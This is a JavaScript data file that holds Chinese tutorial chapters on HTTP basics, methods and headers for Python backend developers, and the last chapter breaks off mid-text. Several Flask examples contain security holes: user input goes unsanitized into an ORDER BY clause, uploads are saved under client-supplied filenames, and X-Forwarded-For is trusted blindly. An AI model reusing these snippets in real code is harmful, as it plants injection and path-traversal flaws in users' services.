// =============================================================
// Python后端开发指南 - 第2批章节（HTTP协议深度解析 8章）
// =============================================================

export const chapters = [
  {
    id: "pyb-2-1",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTP协议基础",
    content: `

# HTTP协议基础

## 一、HTTP简介与历史版本

HTTP（HyperText Transfer Protocol，超文本传输协议）是Web的基础协议，定义了客户端和服务器之间通信的格式和规则。

### 1.1 HTTP历史版本

| 版本 | 年份 | 特性 |
|------|------|------|
| HTTP/0.9 | 1991 | 仅支持GET，只有HTML，没有头部，请求完即关闭 |
| HTTP/1.0 | 1996 | 支持POST/HEAD等方法，有头部、状态码、多内容类型 |
| HTTP/1.1 | 1997 | 持久连接Keep-Alive、管道化、Host头、缓存控制、分块传输 |
| HTTP/2 | 2015 | 二进制分帧、多路复用、头部压缩、服务器推送 |
| HTTP/3 | 2022 | 基于QUIC（UDP）、0-RTT建连、解决队头阻塞 |

### 1.2 HTTP/0.9（已淘汰）

最简单的版本，只有GET方法：
\`\`\`
GET /index.html
(响应只有HTML，没有头部)
<html>...</html>
\`\`\`

### 1.3 HTTP/1.0 vs HTTP/1.1

HTTP/1.0的问题：
- 每个请求都要新建TCP连接（三次握手开销大）
- 不支持Host头，一个IP只能托管一个域名

HTTP/1.1的改进：
1. **持久连接**（默认开启）：一个TCP连接可以发多个请求
2. **管道化**（Pipelining）：可以连续发多个请求不用等响应，但响应必须按序返回
3. **Host头部**：一个IP可以托管多个域名（虚拟主机）
4. **分块传输编码**：Transfer-Encoding: chunked，动态生成内容
5. **缓存控制**：Cache-Control、ETag等
6. **更多方法**：PUT、DELETE、OPTIONS、PATCH等
7. **状态码增多**：100、206、303、304等

\`\`\`python
# HTTP/1.1 请求必须包含Host头
request = (
    "GET / HTTP/1.1\\r\\n"
    "Host: www.example.com\\r\\n"  # HTTP/1.1必需
    "Connection: keep-alive\\r\\n"  # 默认持久连接
    "\\r\\n"
)
\`\`\`

---

## 二、HTTP请求响应结构

### 2.1 HTTP是基于TCP的应用层协议

- 默认端口：HTTP 80，HTTPS 443
- 请求-响应模型：客户端主动发请求，服务器返回响应
- 无状态：服务器不记录之前的请求

### 2.2 请求报文格式

\`\`\`
<方法> <路径> <版本>\\r\\n        ← 请求行
<头部字段名>: <值>\\r\\n          ← 请求头部（可多行）
<头部字段名>: <值>\\r\\n
\\r\\n                             ← 空行（CRLF）
<请求体>                        ← 请求体（GET/HEAD/DELETE通常没有）
\`\`\`

实际示例：
\`\`\`
POST /api/v1/users HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0 Chrome/120.0
Accept: application/json
Content-Type: application/json
Content-Length: 47
Cookie: sessionid=abc123xyz

{"name":"Tom","email":"tom@example.com"}
\`\`\`

### 2.3 响应报文格式

\`\`\`
<版本> <状态码> <原因短语>\\r\\n    ← 状态行
<头部字段名>: <值>\\r\\n            ← 响应头部
\\r\\n                               ← 空行
<响应体>                          ← 响应体
\`\`\`

实际示例：
\`\`\`
HTTP/1.1 201 Created
Server: nginx/1.24.0
Date: Thu, 01 Jan 2024 00:00:00 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 62
Set-Cookie: sessionid=xyz789; HttpOnly; Path=/

{"id":1,"name":"Tom","email":"tom@example.com"}
\`\`\`

---

## 三、HTTP方法概览

### 3.1 方法列表

| 方法 | 作用 | 请求体 | 响应体 | 幂等 | 安全 |
|------|------|--------|--------|------|------|
| GET | 获取资源 | 否 | 是 | 是 | 是 |
| POST | 创建资源/提交数据 | 是 | 是/否 | 否 | 否 |
| PUT | 全量更新资源 | 是 | 是/否 | 是 | 否 |
| PATCH | 部分更新资源 | 是 | 是/否 | 否 | 否 |
| DELETE | 删除资源 | 否 | 是/否 | 是 | 否 |
| HEAD | 获取响应头（无体） | 否 | 否 | 是 | 是 |
| OPTIONS | 获取支持的方法 | 否 | 否 | 是 | 是 |
| TRACE | 追踪请求路径 | 否 | 是 | 是 | 是 |
| CONNECT | 建立隧道连接 | - | - | - | - |

### 3.2 Python发送各种方法

\`\`\`python
import requests

base_url = "https://httpbin.org"

# GET：获取资源
resp = requests.get(f"{base_url}/get", params={"id": 1})
print("GET:", resp.status_code, resp.json()["args"])

# POST：创建资源
resp = requests.post(
    f"{base_url}/post",
    json={"name": "Tom", "age": 25},
    headers={"Authorization": "Bearer token123"}
)
print("POST:", resp.status_code)

# PUT：全量更新（需要提供完整资源）
resp = requests.put(
    f"{base_url}/put",
    json={"id": 1, "name": "Tom", "age": 26}
)

# PATCH：部分更新（只提供修改字段）
resp = requests.patch(
    f"{base_url}/patch",
    json={"age": 26}
)

# DELETE：删除
resp = requests.delete(f"{base_url}/delete")

# HEAD：只获取头部
resp = requests.head(f"{base_url}/get")
print("HEAD headers:", dict(resp.headers))
print("HEAD content:", resp.text)  # 空

# OPTIONS：获取服务器支持的方法
resp = requests.options(f"{base_url}/get")
print("Allow:", resp.headers.get("Allow"))
\`\`\`

---

## 四、在Flask/FastAPI中处理请求

### 4.1 Flask获取请求数据

\`\`\`python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/users", methods=["GET", "POST", "PUT", "DELETE"])
def handle_users():
    # 请求方法
    method = request.method
    print(f"请求方法: {method}")
    
    # 请求路径
    print(f"路径: {request.path}")
    
    # 查询参数 ?page=1&size=10
    page = request.args.get("page", 1, type=int)
    size = request.args.get("size", 10, type=int)
    
    if method == "GET":
        return jsonify({"users": [], "page": page, "size": size})
    
    elif method == "POST":
        # JSON数据
        data = request.get_json()
        # 表单数据
        # data = request.form
        
        # 请求头
        token = request.headers.get("Authorization", "")
        
        # Cookie
        session_id = request.cookies.get("sessionid")
        
        return jsonify({"code": 0, "data": data}), 201
    
    return jsonify({"code": 0})

if __name__ == "__main__":
    app.run(debug=True)
\`\`\`

### 4.2 FastAPI处理请求

\`\`\`python
from fastapi import FastAPI, Request, Header, Cookie
from pydantic import BaseModel
from typing import Optional

app = FastAPI()

class UserCreate(BaseModel):
    name: str
    age: int
    email: Optional[str] = None

@app.get("/api/users")
def list_users(page: int = 1, size: int = 10):
    return {"users": [], "page": page, "size": size}

@app.post("/api/users", status_code=201)
def create_user(
    user: UserCreate,
    authorization: Optional[str] = Header(None),
    sessionid: Optional[str] = Cookie(None)
):
    return {"id": 1, **user.dict()}

@app.put("/api/users/{user_id}")
def update_user(user_id: int, user: UserCreate):
    return {"id": user_id, **user.dict()}

@app.delete("/api/users/{user_id}")
def delete_user(user_id: int):
    return {"message": f"用户{user_id}已删除"}
\`\`\`

---

## 五、常见坑点与最佳实践

### 5.1 URL长度限制

GET请求的参数在URL中，不同浏览器和服务器对URL长度有限制：
- IE：约2083字符
- Chrome：约8182字符
- 服务器（Nginx默认）：约8KB
- 建议：参数超过2KB或包含敏感信息用POST

### 5.2 不要用GET做敏感操作

\`\`\`python
# 错误！GET请求可能被浏览器预加载、爬虫访问、CDN缓存
@app.route("/delete-post/<int:post_id>")
def delete_post(post_id):
    post = Post.query.get(post_id)
    db.session.delete(post)
    db.session.commit()
    return "删除成功"

# 正确！用DELETE或POST
@app.route("/api/posts/<int:post_id>", methods=["DELETE"])
def delete_post(post_id):
    # 需要认证
    # 删除操作
    return jsonify({"message": "删除成功"})
\`\`\`

### 5.3 POST发送数据要用正确Content-Type

\`\`\`python
# 1. 发送JSON（现在最常用）
requests.post(url, json={"key": "value"})
# Content-Type: application/json

# 2. 发送表单（传统网页表单）
requests.post(url, data={"key": "value"})
# Content-Type: application/x-www-form-urlencoded

# 3. 发送文件
requests.post(url, files={"file": open("test.txt", "rb")})
# Content-Type: multipart/form-data
\`\`\`

---

## 六、常见面试题

### HTTP 1.0和1.1的区别？

1.1新增持久连接（默认Keep-Alive）、管道化、Host头（虚拟主机）、分块传输、更多缓存控制和状态码、OPTIONS/PUT/DELETE等方法。

### GET和POST的区别？

- GET参数在URL，POST在请求体
- GET有长度限制，POST没有（实际也有但大很多）
- GET幂等安全，POST不幂等
- GET会被浏览器缓存、保留历史记录，POST不会
- GET用于获取数据，POST用于提交数据

### HTTP请求报文由哪几部分组成？

请求行（方法、URL、版本）、请求头部、空行、请求体。

---

## 七、本章小结

- HTTP是Web基础，经历了0.9→1.0→1.1→2→3的演进
- HTTP/1.1是目前最广泛使用的版本
- 请求报文：请求行+头部+空行+体
- 响应报文：状态行+头部+空行+体
- 主要方法：GET查、POST增、PUT改、DELETE删
- GET参数在URL，POST在请求体
`
  },
  {
    id: "pyb-2-2",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTP请求方法详解",
    content: `

# HTTP请求方法详解

## 一、幂等性与安全性

理解幂等性和安全性是正确使用HTTP方法的基础。

### 1.1 安全性（Safe Methods）

安全方法是指**不会修改服务器状态**的方法，只用于获取信息：
- GET、HEAD、OPTIONS、TRACE是安全的
- POST、PUT、PATCH、DELETE不是安全的

安全方法可以被浏览器预加载（prefetch）、缓存、爬虫爬取。

### 1.2 幂等性（Idempotent Methods）

幂等性是指**执行一次和执行多次效果相同**：
- GET、HEAD、OPTIONS、TRACE、PUT、DELETE是幂等的
- POST、PATCH不是幂等的

\`\`\`
GET /users/1     → 获取用户1，每次结果相同（幂等）
DELETE /users/1  → 删除用户1，删一次和删N次都删了（幂等）
PUT /users/1     → 全量更新用户1，更新N次结果一样（幂等）
POST /users      → 创建用户，每次创建新用户，N次创建N个（不幂等）
POST /pay       → 支付，N次支付N次扣钱（不幂等，要防重复提交）
\`\`\`

### 1.3 为什么幂等性很重要？

网络不稳定时请求可能重试，幂等的方法重试不会产生副作用。支付接口如果不幂等，用户点一次支付可能扣多次钱。

**非幂等接口如何保证不重复提交**：
\`\`\`python
from flask import Flask, request, jsonify, session
import uuid

app = Flask(__name__)
app.secret_key = "secret"

# 方法1：Token机制（表单提交）
@app.route("/api/submit", methods=["POST"])
def submit():
    token = request.json.get("token")
    if not token or token != session.get("submit_token"):
        return jsonify({"error": "重复提交或token无效"}), 400
    # 处理完成后清除token
    session.pop("submit_token", None)
    # 处理业务...
    return jsonify({"success": True})

# 方法2：唯一请求ID（API接口）
processed_requests = set()

@app.route("/api/pay", methods=["POST"])
def pay():
    request_id = request.headers.get("X-Request-ID")
    if not request_id:
        return jsonify({"error": "缺少X-Request-ID"}), 400
    if request_id in processed_requests:
        return jsonify({"error": "重复请求"}), 409
    processed_requests.add(request_id)
    # 支付处理...
    return jsonify({"success": True})

# 方法3：数据库唯一约束（最可靠）
# 例如订单表的order_no字段设置唯一索引，重复插入会报错
\`\`\`

---

## 二、GET方法详解

### 2.1 GET的正确用法

- 获取资源，不产生副作用
- 可以被缓存
- 参数在URL中（查询字符串）
- 可以收藏为书签

\`\`\`python
from flask import Flask, request, jsonify

app = Flask(__name__)

# 列表页：分页、筛选、排序
@app.route("/api/products")
def list_products():
    page = request.args.get("page", 1, type=int)
    size = request.args.get("size", 20, type=int)
    category = request.args.get("category")
    sort = request.args.get("sort", "id")  # id/price/sales
    order = request.args.get("order", "desc")  # asc/desc
    keyword = request.args.get("keyword")
    
    query = Product.query
    if category:
        query = query.filter_by(category=category)
    if keyword:
        query = query.filter(Product.name.contains(keyword))
    
    pagination = query.order_by(
        f"{sort} {order}"
    ).paginate(page=page, per_page=size)
    
    return jsonify({
        "list": [p.to_dict() for p in pagination.items],
        "total": pagination.total,
        "page": page,
        "size": size
    })

# 详情页
@app.route("/api/products/<int:product_id>")
def get_product(product_id):
    product = Product.query.get_or_404(product_id)
    return jsonify(product.to_dict())
\`\`\`

### 2.2 GET的常见误用

1. **GET修改数据**：
\`\`\`python
# 错误！GET请求会被浏览器预加载、爬虫爬取
@app.route("/add-to-cart/<int:product_id>")
def add_to_cart(product_id):
    cart.add(product_id)  # 副作用！
    return redirect("/cart")

# 正确：用POST
@app.route("/api/cart/items", methods=["POST"])
def add_to_cart_api():
    product_id = request.json["product_id"]
    cart.add(product_id)
    return jsonify({"success": True})
\`\`\`

2. **GET传敏感信息**：
\`\`\`
# 错误！密码在URL中，会被记录在浏览器历史、服务器日志、Referer头
GET /login?username=tom&password=123456 HTTP/1.1

# 正确：用POST+请求体
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"tom","password":"123456"}
\`\`\`

3. **GET传大量数据**：URL长度有限制（2KB-8KB），大数据用POST。

---

## 三、POST方法详解

### 3.1 POST的用途

- 创建新资源
- 提交表单数据
- 提交敏感信息
- 上传文件
- 执行需要副作用的操作（支付、下单等）

### 3.2 POST提交数据的格式

\`\`\`python
import requests

# 1. application/json（最常用，AJAX请求）
resp = requests.post(
    "https://httpbin.org/post",
    json={"name": "Tom", "age": 25},
    headers={"Content-Type": "application/json"}
)

# 2. application/x-www-form-urlencoded（传统表单默认）
# name=Tom&age=25
resp = requests.post(
    "https://httpbin.org/post",
    data={"name": "Tom", "age": 25}
)

# 3. multipart/form-data（文件上传）
resp = requests.post(
    "https://httpbin.org/post",
    data={"name": "Tom"},
    files={"avatar": open("avatar.jpg", "rb")}
)

# 4. text/plain（纯文本）
resp = requests.post(
    "https://httpbin.org/post",
    data="Hello World",
    headers={"Content-Type": "text/plain"}
)
\`\`\`

Flask中接收不同格式：
\`\`\`python
from flask import Flask, request

app = Flask(__name__)

@app.route("/api/upload", methods=["POST"])
def upload():
    # JSON数据
    json_data = request.get_json(silent=True)
    
    # 表单数据
    form_data = request.form
    name = form_data.get("name")
    
    # 文件
    f = request.files.get("avatar")
    if f:
        f.save(f"uploads/{f.filename}")
    
    # 原始数据
    raw_data = request.data  # bytes
    
    return "OK"
\`\`\`

---

## 四、PUT vs PATCH

### 4.1 PUT：全量更新

PUT是**全量替换**资源，必须提供完整的资源数据。

\`\`\`
PUT /api/users/1
Content-Type: application/json

{"id":1,"name":"Tom","age":26,"email":"tom@example.com"}
\`\`\`

如果只传{"age":26}，那么其他字段会被清空/设为默认值。

### 4.2 PATCH：部分更新

PATCH是**部分更新**，只提供需要修改的字段。

\`\`\`
PATCH /api/users/1
Content-Type: application/json

{"age":26}
\`\`\`

只更新age字段，其他字段保持不变。

\`\`\`python
from flask import Flask, request, jsonify

app = Flask(__name__)
users = {1: {"id": 1, "name": "Tom", "age": 25, "email": "tom@example.com"}}

@app.route("/api/users/<int:user_id>", methods=["PUT"])
def update_user_put(user_id):
    """全量更新"""
    user = users.get(user_id)
    if not user:
        return jsonify({"error": "用户不存在"}), 404
    
    data = request.get_json()
    # 必须验证所有必填字段
    required = ["name", "age", "email"]
    for field in required:
        if field not in data:
            return jsonify({"error": f"缺少字段: {field}"}), 400
    
    users[user_id] = {"id": user_id, **data}
    return jsonify(users[user_id])

@app.route("/api/users/<int:user_id>", methods=["PATCH"])
def update_user_patch(user_id):
    """部分更新"""
    user = users.get(user_id)
    if not user:
        return jsonify({"error": "用户不存在"}), 404
    
    data = request.get_json()
    # 只更新提供的字段
    allowed_fields = ["name", "age", "email"]
    for key, value in data.items():
        if key in allowed_fields:
            user[key] = value
    
    return jsonify(user)

if __name__ == "__main__":
    app.run(debug=True)
\`\`\`

### 4.3 实际工作中怎么选？

- 严格RESTful：PUT全量，PATCH部分
- 实际项目中，很多团队直接用PUT甚至POST做更新，不用PATCH
- 如果API要公开给第三方，遵循RESTful规范；内部API灵活选择

---

## 五、DELETE方法

### 5.1 删除资源

\`\`\`
DELETE /api/users/1     → 删除用户1
DELETE /api/posts/1/comments/2  → 删除文章1的评论2
\`\`\`

DELETE是幂等的：删一次和删多次效果一样（资源不存在了）。

### 5.2 软删除 vs 硬删除

- **硬删除**：直接从数据库删除（DELETE FROM）
- **软删除**：加字段标记删除（如is_deleted=True），数据还在

\`\`\`python
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

db = SQLAlchemy()

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100))
    is_deleted = db.Column(db.Boolean, default=False)  # 软删除标记
    deleted_at = db.Column(db.DateTime)

# 硬删除
@app.route("/api/users/<int:user_id>", methods=["DELETE"])
def hard_delete(user_id):
    user = User.query.get_or_404(user_id)
    db.session.delete(user)
    db.session.commit()
    return jsonify({"message": "删除成功"})

# 软删除（更常用，可恢复）
@app.route("/api/users/<int:user_id>", methods=["DELETE"])
def soft_delete(user_id):
    user = User.query.get_or_404(user_id)
    user.is_deleted = True
    user.deleted_at = datetime.now()
    db.session.commit()
    return jsonify({"message": "已删除"})

# 查询时自动过滤已删除
class BaseModel(db.Model):
    __abstract__ = True
    is_deleted = db.Column(db.Boolean, default=False)
    
    @classmethod
    def query_active(cls):
        return cls.query.filter_by(is_deleted=False)
\`\`\`

### 5.3 删除响应状态码

- 200 OK：返回删除的资源信息
- 204 No Content：删除成功，无响应体（推荐）
- 404 Not Found：资源不存在

---

## 六、OPTIONS方法与CORS预检

### 6.1 OPTIONS的作用

OPTIONS用于获取目标资源支持的HTTP方法和通信选项。在CORS跨域请求中，浏览器会先发送OPTIONS预检请求。

**CORS简单请求 vs 预检请求**：
- 简单请求：GET/POST/HEAD，Content-Type是application/x-www-form-urlencoded、multipart/form-data、text/plain，直接发送
- 预检请求：PUT/DELETE/PATCH、Content-Type是application/json、有自定义头部，先发送OPTIONS

\`\`\`python
# Flask中处理CORS
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # 允许所有跨域（开发环境）

# 生产环境配置
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://example.com", "https://www.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True
    }
})
\`\`\`

FastAPI中：
\`\`\`python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://example.com"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
\`\`\`

---

## 七、HEAD方法

HEAD和GET类似，但服务器只返回响应头，不返回响应体。用于：
- 检查资源是否存在（看状态码）
- 获取资源元信息（Content-Length、Last-Modified）
- 检查缓存有效性

\`\`\`python
import requests

resp = requests.head("https://httpbin.org/image/png")
print(resp.headers["Content-Type"])  # image/png
print(resp.headers["Content-Length"])  # 文件大小
print(resp.text)  # 空字符串
\`\`\`

---

## 八、RESTful API最佳实践

### 8.1 RESTful设计原则

1. **URL用名词复数**，不用动词：
\`\`\`
# 好
GET    /api/users           获取用户列表
GET    /api/users/1         获取用户1
POST   /api/users           创建用户
PUT    /api/users/1         更新用户1
DELETE /api/users/1         删除用户1

# 不好
GET /getUser?id=1
POST /createUser
GET /deleteUser?id=1
\`\`\`

2. **层级关系表示**：
\`\`\`
GET /api/users/1/orders     获取用户1的订单
POST /api/users/1/orders    用户1创建订单
\`\`\`

3. **正确使用状态码**：
\`\`\`
200 OK           成功
201 Created      创建成功
204 No Content   删除成功
400 Bad Request  参数错误
401 Unauthorized 未登录
403 Forbidden    无权限
404 Not Found    资源不存在
422 Unprocessable Entity 验证失败
500 Internal Server Error 服务器错误
\`\`\`

4. **版本管理**：
\`\`\`
/api/v1/users
/api/v2/users
\`\`\`

### 8.2 统一响应格式

\`\`\`python
from flask import Flask, jsonify

app = Flask(__name__)

def success(data=None, message="success", status_code=200):
    return jsonify({
        "code": 0,
        "message": message,
        "data": data
    }), status_code

def error(code, message, status_code=400):
    return jsonify({
        "code": code,
        "message": message,
        "data": None
    }), status_code

@app.route("/api/users/<int:user_id>")
def get_user(user_id):
    user = get_user_by_id(user_id)
    if not user:
        return error(40401, "用户不存在", 404)
    return success(user)

@app.route("/api/users", methods=["POST"])
def create_user():
    data = request.get_json()
    if not data.get("name"):
        return error(40001, "用户名不能为空", 400)
    user = create_new_user(data)
    return success(user, "创建成功", 201)
\`\`\`

---

## 九、常见面试题

### GET和POST的本质区别？

- 语义不同：GET获取，POST提交
- 幂等安全：GET安全幂等，POST不是
- 参数位置：GET在URL，POST在请求体
- 缓存：GET可缓存，POST默认不可
- 但本质上都是TCP连接，POST也可以把参数放URL（只是规范不推荐）

### PUT和PATCH的区别？

PUT是全量替换资源，必须提供完整数据；PATCH是部分更新，只提供修改字段。PUT幂等，PATCH不幂等（JSON Patch是幂等的但一般用JSON Merge Patch）。

### 什么是幂等性？哪些HTTP方法是幂等的？

幂等是执行一次和多次效果相同。GET/HEAD/OPTIONS/PUT/DELETE是幂等的，POST/PATCH不是。非幂等接口需要防重复提交（token、唯一请求ID、数据库唯一约束）。

### OPTIONS方法有什么用？

OPTIONS用于获取服务器支持的方法。CORS跨域时，浏览器对非简单请求会先发OPTIONS预检请求，检查服务器是否允许实际请求。

---

## 十、本章小结

- 安全方法不修改服务器状态：GET/HEAD/OPTIONS
- 幂等方法执行多次效果相同：GET/PUT/DELETE等
- GET查、POST增、PUT全量改、PATCH部分改、DELETE删
- GET不要用于修改数据或传敏感信息
- POST支持多种Content-Type，API常用application/json
- PUT和PATCH的区别是全量vs部分更新
- 软删除比硬删除更常用
- RESTful API用名词URL，正确使用状态码
`
  },
  {
    id: "pyb-2-3",
    group: "HTTP协议深度解析",
    icon: "📡",
    title: "HTTP头部字段详解",
    content: `

# HTTP头部字段详解

HTTP头部（Headers）是HTTP消息的元数据，描述了消息体、连接、缓存、认证等信息。

## 一、头部字段分类

HTTP头部分为四大类：

| 类型 | 说明 | 示例 |
|------|------|------|
| 通用头部 | 请求和响应都可以用 | Cache-Control、Connection |
| 请求头部 | 仅请求使用 | User-Agent、Accept、Cookie |
| 响应头部 | 仅响应使用 | Server、Set-Cookie、Location |
| 实体头部 | 描述消息体 | Content-Type、Content-Length、Content-Encoding |

头部字段名不区分大小写，但惯例用驼峰（如Content-Type）。

---

## 二、通用头部

### 2.1 Connection - 连接管理

\`\`\`
Connection: keep-alive    # 持久连接（HTTP/1.1默认）
Connection: close        # 响应后关闭连接
Connection: upgrade      # 升级协议（如WebSocket）
\`\`\`

HTTP/1.1默认使用Keep-Alive，一个TCP连接可以发送多个请求，减少握手开销。

### 2.2 Cache-Control - 缓存控制

（详见HTTP缓存章节，这里只列常用值）
\`\`\`
Cache-Control: no-cache          # 每次都验证
Cache-Control: no-store          # 不缓存
Cache-Control: max-age=3600      # 缓存1小时（秒）
Cache-Control: public            # CDN等可缓存
Cache-Control: private           # 只有客户端可缓存
\`\`\`

### 2.3 Upgrade - 协议升级

用于升级到其他协议，如WebSocket：
\`\`\`
# 请求
GET /ws HTTP/1.1
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

# 响应
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
\`\`\`

---

## 三、请求头部

### 3.1 Host - 目标主机（HTTP/1.1必需）

\`\`\`
Host: www.example.com
Host: api.example.com:8080
\`\`\`

Host头用于虚拟主机，一个IP可以托管多个域名，Nginx根据Host转发到不同站点。

### 3.2 User-Agent - 客户端信息

标识客户端（浏览器、爬虫等）：
\`\`\`
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
User-Agent: python-requests/2.31.0
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
\`\`\`

Python爬虫常需要设置UA，否则可能被拦截：
\`\`\`python
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0"
}
resp = requests.get(url, headers=headers)
\`\`\`

### 3.3 Accept系列 - 内容协商

客户端告诉服务器能接受什么格式：

\`\`\`
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Charset: utf-8, iso-8859-1;q=0.5
\`\`\`

q值表示优先级（0-1），默认1。q=0表示不接受。

Flask中实现内容协商：
\`\`\`python
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route("/users")
def users():
    users = [{"id": 1, "name": "Tom"}]
    
    # 根据Accept返回不同格式
    best = request.accept_mimetypes.best_match(
        ["application/json", "text/html"]
    )
    if best == "application/json":
        return jsonify(users)
    return render_template("users.html", users=users)
\`\`\`

### 3.4 Content-Type - 请求体格式

\`\`\`
Content-Type: application/json                              # JSON
Content-Type: application/x-www-form-urlencoded            # 表单
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx  # 文件上传
Content-Type: text/plain; charset=utf-8                    # 纯文本
\`\`\`

### 3.5 Content-Length - 请求体长度（字节）

\`\`\`
Content-Length: 47
\`\`\`

如果是分块传输（Transfer-Encoding: chunked），不需要Content-Length。

### 3.6 Cookie - 客户端Cookie

\`\`\`
Cookie: sessionid=abc123; theme=dark; lang=zh-CN
\`\`\`

客户端把之前服务器通过Set-Cookie设置的Cookie回传给服务器。

### 3.7 Authorization - 认证信息

\`\`\`
# Bearer Token（JWT常用）
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Basic Auth
Authorization: Basic dG9tOjEyMzQ1Ng==   # base64(username:password)

# Digest Auth
Authorization: Digest username="tom", realm="...", nonce="...", uri="...", response="..."
\`\`\`

FastAPI中使用JWT认证示例：
\`\`\`python
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt

app = FastAPI()
security = HTTPBearer()
SECRET_KEY = "your-secret-key"

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        user_id = payload.get("user_id")
    except jwt.PyJWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="无效的认证凭据"
        )
    return user_id

@app.get("/api/me")
async def me(user_id: int = Depends(get_current_user)):
    return {"user_id": user_id}
\`\`\`

### 3.8 Referer - 请求来源

表示从哪个页面跳转过来的：
\`\`\`
Referer: https://www.google.com/search?q=python
Referer: https://example.com/page1
\`\`\`

用于防盗链、统计来源等。注意单词正确拼法是Referrer，但HTTP里写成Referer（历史错误保留）。

防盗链示例：
\`\`\`python
from flask import Flask, request, abort

app = Flask(__name__)

@app.route("/images/<path:filename>")
def serve_image(filename):
    referer = request.headers.get("Referer", "")
    # 允许空Referer（直接访问）和本站访问
    if referer and "example.com" not in referer:
        abort(403)  # 防盗链
    return send_from_directory("images", filename)
\`\`\`

### 3.9 Origin - 请求来源（CORS）

用于CORS跨域，比Referer更简单，只包含协议+域名+端口：
\`\`\`
Origin: https://example.com
\`\`\`

POST/PUT/DELETE等跨域请求会带Origin头。

### 3.10 If-Modified-Since / If-None-Match - 缓存验证

（详见缓存章节）
\`\`\`
If-Modified-Since: Thu, 01 Jan 2024 00:00:00 GMT
If-None-Match: "abc123"
\`\`\`

### 3.11 自定义头部（X-前缀）

项目可以自定义头部，通常用X-前缀：
\`\`\`
X-Request-ID: abc-123-def        # 请求追踪ID
X-Forwarded-For: 1.2.3.4        # 客户端真实IP（Nginx代理后）
X-Forwarded-Proto: https        # 原始协议
X-RateLimit-Limit: 100          # 限流上限
X-RateLimit-Remaining: 95       # 剩余请求数
\`\`\`

Flask获取真实IP：
\`\`\`python
@app.before_request
def before_request():
    # Nginx代理后request.remote_addr是127.0.0.1
    # 需要从X-Forwarded-For获取真实IP
    if "X-Forwarded-For" in request.headers:
        request.real_ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
    else:
        request.real_ip = request.remote_addr
\`\`\`

---

## 四、响应头部

### 4.1 Server - 服务器软件

\`\`\`
Server: nginx/1.24.0
Server: gunicorn/21.2.0
Server: Werkzeug/3.0.1 Python/3.11.5
\`\`\`

生产环境建议隐藏具体版本号（安全考虑）。

### 4.2 Location - 重定向地址

3xx状态码时告诉浏览器跳转到哪里：
\`\`\`
HTTP/1.1 301 Moved Permanently
Location: https://www.example.com/new-url

HTTP/1.1 302 Found
Location: /login
\`\`\`

### 4.3 Set-Cookie - 设置Cookie

服务器在响应中通过Set-Cookie告诉浏览器设置Cookie：
\`\`\`
Set-Cookie: sessionid=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
Set-Cookie: theme=dark; Path=/; Max-Age=31536000
\`\`\`

每个属性在下一章详解。

### 4.4 Content-Type - 响应体格式

\`\`\`
Content-Type: text/html; charset=utf-8
Content-Type: application/json; charset=utf-8
Content-Type: image/jpeg
Content-Type: application/octet-stream
\`\`\`

### 4.5 Content-Disposition - 内容处置

告诉浏览器是显示还是下载：
\`\`\`
Content-Disposition: inline                          # 在浏览器中显示
Content-Disposition: attachment; filename="report.pdf"  # 下载，指定文件名
\`\`\`

Flask中发送文件：
\`\`\`python
from flask import send_file

@app.route("/download")
def download():
    # 浏览器直接显示
    return send_file("report.pdf", as_attachment=False)
    
    # 触发下载
    return send_file(
        "report.pdf",
        as_attachment=True,
        download_name="2024年度报告.pdf"
    )
\`\`\`

### 4.6 Content-Encoding - 内容编码

通常是压缩方式：
\`\`\`
Content-Encoding: gzip
Content-Encoding: br        # Brotli，比gzip压缩率更高
Content-Encoding: deflate
\`\`\`

Nginx开启gzip压缩：
\`\`\`nginx
gzip on;
gzip_types text/plain text/css application/json application/javascript text/xml application/xml;
gzip_min_length 1024;
\`\`\`

### 4.7 Access-Control-Allow-Origin - CORS

\`\`\`
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  # 预检请求缓存时间
\`\`\`

### 4.8 WWW-Authenticate - 认证要求

401响应中告诉客户端用什么认证方式：
\`\`\`
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api"
